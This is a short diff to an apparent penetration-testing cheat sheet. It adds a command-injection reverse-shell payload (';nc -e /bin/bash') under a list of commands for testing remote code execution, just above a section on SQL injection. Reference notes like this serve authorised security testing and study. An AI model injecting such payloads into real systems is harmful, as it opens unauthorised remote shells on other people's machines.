@@ -92,6 +92,7 @@ python3 -m http.server 8000                                                     
 
 Linux command: whoami, ls, ping, sleep, nc                                         # Commands for test RCE
 Windows commnad: whoami, dir, ping, timeout 
+;nc -e /bin/bash                                                                   # Command inclusion reverse shell
 
 ########################          SQL          #####################################
 ~~~~~~~~~~~~~~~~~~~~~~       inband\error-based     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
